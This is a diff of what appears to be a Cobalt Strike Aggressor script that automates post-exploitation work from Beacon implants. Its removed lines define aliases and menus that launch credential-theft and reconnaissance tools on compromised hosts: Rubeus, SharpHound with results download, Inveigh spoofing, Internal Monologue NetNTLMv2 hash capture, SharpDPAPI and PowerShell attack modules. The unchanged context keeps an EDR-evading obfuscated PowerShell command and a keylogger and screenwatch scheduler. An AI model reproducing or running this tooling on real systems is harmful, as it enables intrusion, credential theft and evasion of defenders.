@@ -38,7 +38,6 @@
 #   - adds command 'ipconfig' for listing network interfaces on the machine
 #   - adds command 'powershell-clear' for clearing the imported PowerShell script from a Beacon session
 #   - adds command 'syncall' to sync all downloaded files on demand
-#   - adds command 'whoami' for running 'run whoami /user /fo list'
 #   - adds command 'assembly' as an alias for `execute-assembly`
 #
 #   - enhances 'cd' command to make it restore previous path if "cd -" was issued
@@ -60,25 +59,6 @@
 #   - adds command 'inline-execute-assembly' which uses preconfigured .NET assemblies lookup directory and
 #       automatically invokes one of supported inlineExecute-Assembly / ExecuteAssembly BOFs.
 #
-#   - adds command 'stracciatella-activedirectory' to ease use of ActiveDirectory Powershell module straight from Beacon's console.
-#
-#   - adds command 'import-mailsniper' to import MailSniper.ps1
-#   - adds command 'import-powerup' to import PowerUp.ps1
-#   - adds command 'import-powerupsql' to import PowerUpSQL.ps1
-#   - adds command 'import-powerview' to import PowerView_dev.ps1
-#   - adds command 'import-thehash' to import Invoke-TheHash.ps1
-#
-#   - adds command 'launch-inveigh' to launch InveighZero in specified options
-#   - adds command 'launch-monologue' to launch Internal Monologue attack by Elad Shamir
-#   - adds command 'launch-sharpshares' to launch SharpShares by Mitch Moser
-#   - adds command 'launch-powerup' to import PowerUp.ps1 and launch Invoke-AllChecks -Verbose
-#   - adds command 'launch-rubeus' to quickly launch Rubeus assembly with default options: 'triage'
-#   - adds command 'launch-seatbelt' to quickly launch SeatBelt assembly with default options: 'all'
-#   - adds command 'launch-sharphound' to launch SharpHound ingestor assembly with default options: '-c All'
-#   - adds command 'launch-sharpup' to quickly launch SharpUp assembly
-#   - adds command 'launch-sharpdpapi' to quickly launch SharpDPAPI assembly
-#   - adds command 'launch-sharpwmi' to launch modified SharpWMI assembly able to retrieve WMI command output
-#   - adds command 'launch-watson' to quickly launch Watson assembly
 #
 #   - adds command 'kerberos-purge' to quickly purge all Kerberos tickets from Beacon's process memory
 #
@@ -86,7 +66,6 @@
 #       - "Job Kill" allowing to review list of running Jobs in a Beacon and select one to kill it.
 #       - "Mass Run" offering: Checkin, Jobs, Getuid, Shell, Powershell, Powerpick
 #       - "Schedule Keylogger and Screenwatch" helper to instantly run sleep + screenwatch + keylogger on a beacon
-#       - "Launch": offering handy way of invoking our defined "launch-" aliases
 #
 #   - adds several auto-notes to Beacons on events such as: sleep changed, initial check-in, exit, 
 #       domain found, ppid set - that makes it handy to later keep track of such metadata
@@ -874,99 +853,6 @@ popup beacon_bottom {
                 }, @ids => $1));
             }
         }
-
-        menu "&Launch..." {
-            item "launch-powerup" {
-                binput($1, "launch-powerup");
-                foreach $bid ($1) {
-                    fireAlias($1, "launch-powerup", "");
-                }
-            }
-
-            item "launch-inveigh" {
-                binput($1, "launch-inveigh");
-                prompt_text("How long would you like to run Inveigh (in minutes)?", "10") {
-                    foreach $bid ($1) {
-                        fireAlias($bid, "launch-inveigh", "$1");
-                    }
-                }
-            }
-            
-            item "launch-sharpup" {
-                binput($1, "launch-sharpup");
-                foreach $bid ($1) {
-                    fireAlias($bid, "launch-sharpup", "");
-                }
-            }
-
-            item "launch-watson" {
-                binput($1, "launch-watson");
-                foreach $bid ($1) {
-                    fireAlias($1, "launch-watson", "");
-                }
-            }
-            
-            item "launch-sharphound" {
-                binput($1, "launch-sharphound");
-                prompt_text("Specify domain name for Sharphound:", "") {
-                    foreach $bid ($1) {
-                        fireAlias($1, "launch-sharphound", "$1");
-                    }
-                }
-            }
-            
-            item "launch-monologue" {
-                binput($1, "launch-monologue");
-                foreach $bid ($1) {
-                    fireAlias($1, "launch-monologue", "");
-                }
-            }
-
-            item "launch-sharpshares" {
-                binput($1, "launch-sharpshares");
-                foreach $bid ($1) {
-                    fireAlias($1, "launch-sharpshares", "");
-                }
-            }
-        }
-
-        menu "&Powershell Import..." {
-            item "import-powerup" {
-                binput($1, "import-powerup");
-                foreach $bid ($1) {
-                    fireAlias($1, "import-powerup", "");
-                }
-            }
-            
-            item "import-powerview" {
-                binput($1, "import-powerview");
-                foreach $bid ($1) {
-                    fireAlias($1, "import-powerview", "");
-                }
-            }
-            
-            item "import-powerupsql" {
-                binput($1, "import-powerupsql");
-                foreach $bid ($1) {
-                    fireAlias($1, "import-powerupsql", "");
-                }
-            }
-
-            item "import-mailsniper" {
-                binput($1, "import-mailsniper");
-                foreach $bid ($1) {
-                    fireAlias($1, "import-mailsniper", "");
-                }
-            }
-            
-            item "import-thehash" {
-                binput($1, "import-thehash");
-                foreach $bid ($1) {
-                    fireAlias($1, "import-thehash", "");
-                }
-            }
-        }
-
         item "&Schedule Keylogger and Screenwatch" {
         	foreach $bid ($1) {
                 prompt_text("What Sleep to set? Impacts how often you receive screenshots and keystrokes:", "", lambda({
@@ -1009,91 +895,6 @@ beacon_command_register(
     "Use: execute-assembly </path/to/file.exe|filename> [arguments]\n\nExecutes a local .NET process assembly on target. This command loads the CLR in a temporary
 process and loads the assembly into it. If the specified assembly's name is not found, \nwill try to look for it in a preconfigured directory, in a similar fashion $PATH variable works.");
 
-beacon_command_register(
-    "import-powerview",
-    "Loads PowerView.ps1 using powershell-import (dev)",
-    "Use: import-powerview\n\nDescription: Simply imports locally stored PowerView_dev.ps1 script into beacon's runspace.");
-
-beacon_command_register(
-    "import-mailsniper",
-    "Loads MailSniper.ps1 using powershell-import",
-    "Use: import-mailsniper\n\nDescription: Simply imports locally stored MailSniper.ps1 script into beacon's runspace.");
-
-beacon_command_register(
-    "import-powerupsql",
-    "Loads PowerUpSQL.ps1 using powershell-import",
-    "Use: import-powerupsql\n\nDescription: Simply imports locally stored PowerUpSQL.ps1 script into beacon's runspace.");
-
-beacon_command_register(
-    "import-powerup",
-    "Loads PowerUp.ps1 using powershell-import",
-    "Use: import-powerup\n\nDescription: Simply imports locally stored PowerUp.ps1 script into beacon's runspace.");
-
-beacon_command_register(
-    "import-thehash",
-    "Loads Invoke-TheHash.ps1 using powershell-import",
-    "Use: import-thehash\n\nDescription: Simply imports locally stored Invoke-TheHash.ps1 script into beacon's runspace.");
-
-beacon_command_register(
-    "stracciatella-activedirectory",
-    "Pre-Loads ActiveDirectory Powershell module and executes specified command in Stracciatella.",
-    "Use: stracciatella-activedirectory <command>\n\nDescription: Assuming there is a Stracciatella.cna script loaded, this alias will pre-load Stracciatella with Import-Module ActiveDirectory\nand then execute given Powershell commands using Stracciatella.");
-
-beacon_command_register(
-    "launch-powerup",
-    "Loads PowerUp.ps1 using powershell-import and then issues Invoke-AllChecks",
-    "Use: launch-powerup\n\nDescription: Simply imports locally stored PowerUp.ps1 script into beacon's runspace and then\ntasks beacon to execute Invoke-AllChecks.");
-
-beacon_command_register(
-    "launch-inveigh",
-    "Launches InveighZero with specified (or default) options.",
-    "Use: launch-inveigh [[minutes] [options]]\n\nDescription: Launches InveighZero for specified amount of minutes with Eleveated or Unprivileged mode depending on Beacon's type and preset options (or custom ones).\n\nIf you wish to redirect spoofed packets to another machine, use -SpooferIP <IP> Inveigh option");
-
-beacon_command_register(
-    "launch-sharpup",
-    "Launches SharpUp assembly with options specified.",
-    "Use: launch-sharpup [options]\n\nDescription: Launches SharpUp with options given to this command.");
-
-beacon_command_register(
-    "launch-sharpdpapi",
-    "Launches SharpDPAPI assembly with options specified.",
-    "Use: launch-sharpdpapi [options]\n\nDescription: Launches SharpDPAPI with options given to this command.");
-
-beacon_command_register(
-    "launch-monologue",
-    "Launches InternalMonologue attack by Elad Shamir to retrieve NetNTLMv2 hashes while unprivileged.",
-    "Use: launch-monologue\n\nDescription: Launches InternalMonologue attack by Elad Shamir to retrieve NetNTLMv2 hashes while unprivileged.");
-
-beacon_command_register(
-    "launch-sharpshares",
-    "Launches SharpShares scanner (by Mitch Moser) that will look for accessible SMB shares within entire Domain.",
-    "Use: launch-sharpshares [options]\n\nDescription: Launches SharpShares scanner (by Mitch Moser) that will look for accessible SMB shares within entire Domain.");
-
-beacon_command_register(
-    "launch-sharpwmi",
-    "Launches modified SharpWMI (able to retrieve WMI command output) assembly with options specified.",
-    "Use: launch-sharpwmi [sharpwmi-options]\n\nDescription: Launches modified SharpWMI (able to retrieve WMI command output) with options given to this command.");
-
-beacon_command_register(
-    "launch-watson",
-    "Launches Watson assembly with options specified.",
-    "Use: launch-watson [watson-options]\n\nDescription: Launches Watson with options given to this command.");
-
-beacon_command_register(
-    "launch-seatbelt",
-    "Launches SeatBelt assembly with options specified (or '-group=system' if none were given).",
-    "Use: launch-seatbelt [seatbelt-options]\n\nDescription: Launches SeatBelt with options given to this command. If none options were given - will launch with 'all'");
-
-beacon_command_register(
-    "launch-rubeus",
-    "Launches Rubeus assembly with options specified (or 'triage' if none were given).",
-    "Use: launch-rubeus [rubeus-options]\n\nDescription: Launches Rubeus with options given to this command. If none options were given - will launch with 'triage'");
-
-beacon_command_register(
-    "launch-sharphound",
-    "Launches SharpHound assembly with options specified (or '-c All' if none were given).",
-    "Use: launch-sharphound <domain.fqdn> [sharphound-options]\n\nDescription: Launches SharpHound ingestor with options given to this command. The first parameter requires to specify domain in FQDN form.");
-
 #author bluescreenofjeff
 beacon_command_register(
 	"pspane", 
@@ -1105,11 +906,6 @@ beacon_command_register(
     "psh",
     "An alternative for `powershell` command using `base64(xor(command))` to STDIN strategy (avoids -Encodedcommand)",
     "Use: psh [command]]\n\nDescription: Runs powershell obfuscated base64(xor(command)) piped to another powershell's command STDIN. In this way we avoid default Cobalt Strike's implementation using '-Encodedcommand' startup parameter that could be picked up by EDRs (such as FireEye HX). The base64 function was obfuscated away for your convenience.");
-
-beacon_command_register(
-    "whoami",
-    "Alias for 'run whoami'",
-    "Use: whoami [options]\n\nDescription: Runs 'whoami' with given parameters.");
 
 beacon_command_register(
     "assembly",
@@ -1192,27 +988,6 @@ beacon_command_register(
 # ==============================================================================
 # START OF ALIASES
 #
-
-alias import-powerview {
-    arsenal::importPowershell($1, $POWERVIEW_PATH);
-}
-
-alias import-powerupsql {
-    arsenal::importPowershell($1, $POWERUPSQL_PATH);
-}
-
-alias import-powerup {
-    arsenal::importPowershell($1, $POWERUP_PATH);
-}
-
-alias import-mailsniper {
-    arsenal::importPowershell($1, $MAILSNIPER_PATH);
-}
-
-alias import-thehash {
-    arsenal::importPowershell($1, $INVOKE_THEHASH_PATH);
-}
-
 #
 # ---
 #
@@ -1222,17 +997,6 @@ alias kerberos-purge {
     bkerberos_ticket_purge($1);
     brun($1, "klist purge");
     fireAlias($1, "launch-rubeus", "purge");
-}
-
-alias whoami {
-    local('$params');
-    $params = "/user /fo list";
-
-    if(strlen($0) > strlen("whoami ")) {
-        $params = substr($0, strlen("whoami "));
-    }
-
-    brun($1, "whoami $params");
 }
 
 alias powershell-clear {
@@ -1595,7 +1359,6 @@ sub beacon_task {
         berror($1, "Could not compile closure for beacon_task (look in Script Console for more details): $message");        
     }
 }
-
 sub checkStracciatella {
     if($stracciatellaAvailable == false) {
         foreach $command (beacon_commands()) {
@@ -1606,7 +1369,6 @@ sub checkStracciatella {
         }
     }
 }
-
 sub preloadInlineExecuteProviders {
 	clear(@available_inline_execute_assembly_bofs);
 
@@ -1667,176 +1429,9 @@ sub arsenal::importPowershell {
 #
 # ---
 #
-
-alias stracciatella-activedirectory {
-    checkStracciatella();
-
-    if(! $stracciatellaAvailable) {
-        berror($1, "Stracciatella is not loaded. Cannot use this command. Make sure you loaded stracciatella.cna script.");
-        return;
-    }
-
-    $command = substr($0, strlen("stracciatella-activedirectory "));
-    $args = "\" $+ $LOAD_ADPSMODULE $+ \" $command";
-
-    arsenal::debug("stracciatella-activedirectory1: stracciatella-script $args");
-    fireAlias($1, "stracciatella-script", $args);
-}
-
 alias powershell-clear {
     bpowershell_import_clear($1);
 }
-
-alias launch-powerup {
-    bpowershell_import!($1, $POWERUP_PATH);
-    if($stracciatellaAvailable) {
-        fireAlias($1, "stracciatella-import", $POWERUP_PATH);
-    }
-
-    arsenal::runPowershell($1, "Invoke-AllChecks -Verbose");
-}
-
-alias launch-inveigh { 
-    local('$params');
-    $elevated = "N";
-
-    if(-isadmin $1) {
-        $elevated = "Y";
-    }
-
-    $minutes = int($2);
-    $pos = strlen("launch-inveigh ");
-
-    if($minutes == 0) {
-        $minutes = 10;
-    }
-    else {
-        $pos = $pos + strlen($2) + 1;
-    }
-
-    $fileOutput = "-FileOutput N";
-
-    if($0 ismatch '.*FileOutput.*') { 
-        $fileOutput = "";
-    }
-
-    $ip = binfo($1, "internal");
-    $params = "-Elevated $elevated -NBNS Y -RunTime $minutes -FileOutput N -HTTP Y -Proxy Y -LLMNR Y -IP $ip -ConsoleStatus 2";
-
-    if(strlen($0) > strlen("launch-inveigh ")) {
-        $params = substr($0, $pos) . " -Elevated $elevated $fileOutput";
-    }
-
-    btask($1, "Tasked beacon to launch Inveigh for $minutes minutes with parameters: $params");
-    arsenal::executeAssembly($1, $INVEIGH_PATH, $params);
-}
-
-alias launch-sharpup {
-    local('$params');
-    $params = "";
-
-    if(strlen($0) > strlen("launch-sharpup ")) {
-        $params = substr($0, strlen("launch-sharpup "));
-    }
-
-    arsenal::executeAssembly($1, $SHARPUP_PATH, $params);
-}
-
-alias launch-sharpdpapi {
-    local('$params');
-    $params = "";
-
-    if(strlen($0) > strlen("launch-sharpdpapi ")) {
-        $params = substr($0, strlen("launch-sharpdpapi "));
-    }
-
-    arsenal::executeAssembly($1, $SHARPDPAPI_PATH, $params);
-}
-
-alias launch-sharpwmi {
-    local('$params');
-    $params = "";
-
-    if(strlen($0) > strlen("launch-sharpwmi ")) {
-        $params = substr($0, strlen("launch-sharpwmi "));
-    }
-
-    arsenal::executeAssembly($1, $SHARPWMI_PATH, $params);
-}
-
-alias launch-watson {
-    local('$params');
-    $params = "";
-
-    if(strlen($0) > strlen("launch-watson ")) {
-        $params = substr($0, strlen("launch-watson "));
-    }
-
-    arsenal::executeAssembly($1, $WATSON_PATH, $params);
-}
-
-alias launch-seatbelt {
-    local('$params');
-    $params = "-group=system";
-
-    if(strlen($0) > strlen("launch-seatbelt ")) {
-        $params = substr($0, strlen("launch-seatbelt "));
-    }
-
-    arsenal::executeAssembly($1, $SEATBELT_PATH, $params);
-}
-
-alias launch-rubeus {
-    local('$params');
-    $params = "triage";
-
-    if(strlen($0) > strlen("launch-rubeus ")) {
-        $params = substr($0, strlen("launch-rubeus "));
-    }
-
-    $params .= " /nowrap";
-    arsenal::executeAssembly($1, $RUBEUS_PATH, $params);
-}
-
-alias launch-sharphound {
-    local('$params');
-    $params = "";
-    $domain = $2;
-
-    if(strlen($domain) == 0) {
-        berror($1, "You need to specify domain name before launching SharpHound!\nUse: launch-sharphound <domain> [options]");
-        return;
-    }
-
-    $pos = strlen("launch-sharphound ") + strlen($domain) + 1;
-    if(strlen($0) > $pos) {
-        $params = substr($0, $pos);
-    }
-
-    $params = $params . " -d $domain";
-
-    btask($1, "Tasked beacon to collect BloodHound data: SharpHound.exe $params");
-    arsenal::executeAssembly($1, $SHARPHOUND_PATH, [$params trim]);
-}
-
-alias launch-monologue {
-    btask($1, "Tasked beacon to retrieve NetNTLMV2 hashes using Internal Monologue attack.");
-    arsenal::executeAssembly($1, $INTRNL_MONOLG_PATH, "");
-}
-
-alias launch-sharpshares {
-    btask($1, "Tasked beacon to search for SMB shares with SharpShares-mitch.");
-
-    local('$params');
-    $params = "/ldap:all /filter:sysvol,netlogon,ipc$,print$";
-
-    if(strlen($0) > strlen("launch-sharpshares ")) {
-        $params = substr($0, strlen("launch-sharpshares "));
-    }
-
-    arsenal::executeAssembly($1, $SHARPSHARES_PATH, $params);
-}
-
 alias inline-execute-assembly {
     local('$bid $localpath $args $tmp $tmp2');
     $bid = shift(@_);
@@ -2217,96 +1812,6 @@ sub arsenal::extractString {
     $param = substr($string, $stringStart + strlen($startPattern), $stringEnd);
     return ["$param" trim];
 }
-
-sub arsenal::parseBloodhoundOutput {
-    local('$bid $out $start_pattern $stop_pattern $resultsFileName');
-    $bid = $1;
-    $out = $2;
-
-    try {
-        $start_pattern = "Compressing data to ";
-        $stop_pattern = "You can upload this file directly to the UI";
-
-        $resultsFileName = arsenal::extractString($out, $start_pattern, $stop_pattern);
-
-        if (strlen($resultsFileName) > 0 ) {
-            btask($bid, "Tasked beacon to download SharpHound results: $resultsFileName");
-            bdownload($bid, $resultsFileName);
-            #brm($bid, $resultsFileName);
-        }
-        else {
-            throw "Could not extract SharpHound results filename!";
-        }
-    }
-    catch $message { 
-        btask($bid, "WARNING: Unable to obtain SharpHound results filename.\nERROR: $message");
-        arsenal::debug("WARNING: Unable to obtain SharpHound results filename.\nERROR: $message");
-        arsenal::debug(getStackTrace()); 
-    }
-}
-
-sub arsenal::parseSeatBeltOutput {
-    local('$bid $out $start_pattern $stop_pattern $domain');
-    $bid = $1;
-    $out = $2;
-
-    try
-    {
-        $start_pattern = "  Domain Name                   :  ";
-        $stop_pattern = "  Username ";
-
-        $domain = arsenal::extractString($out, $start_pattern, $stop_pattern);
-        if (strlen($domain) > 0 )
-        {
-            $domainName = ["$domain" trim];
-            if($bid in keys(%OPERATING_BEACONS)) { 
-                %OPERATING_BEACONS[$bid]["domain"] = $domainName; 
-            }
-            arsenal::appendNote($bid, "(domain: $domainName $+ )");
-        }
-        else
-        {
-            #throw "Could not extract SeatBelt domain name!";
-        }
-    }
-    catch $message 
-    { 
-        #btask($bid, "WARNING: Unable to extract SeatBelt domain name.\nERROR: $message");
-        #arsenal::debug("WARNING: Unable to extract SeatBelt domain name.\nERROR: $message");
-        #arsenal::debug(getStackTrace()); 
-    }
-}
-
-sub arsenal::removeStaleBloodhoundResults {
-    local('$bid $out $start_pattern $stop_pattern $resultsFileName');
-    $bid = $1;
-    $out = $2;
-
-    try {
-        $start_pattern = "download of ";
-        $stop_pattern = "_BloodHound.zip is complete";
-
-        $resultsFileName1 = arsenal::extractString($out, $start_pattern, $stop_pattern);
-
-        if ((strlen($resultsFileName) > 0) || ($out ismatch 'download of (\w+_BloodHound.zip) is complete')) {
-            if(strlen($resultsFileName) == 0) {
-                $resultsFileName = matched();
-            }
-
-            arsenal::debug("Removing stale bloodhound results zip file: $resultsFileName");
-            brm($bid, $resultsFileName);
-        }
-        else {
-            throw "Could not extract SharpHound results filename!";
-        }
-    }
-    catch $message { 
-        btask($bid, "WARNING: Unable to remove SharpHound stale results file.\nERROR: $message");
-        arsenal::debug("WARNING: Unable to remove SharpHound stale results file.\nERROR: $message");
-        arsenal::debug(getStackTrace()); 
-    }
-}
-
 alias syncall {
     if(strlen(%arsenal::defaults["download_files_dst_path"]) > 0) {
         arsenal::syncDownloadedFiles();
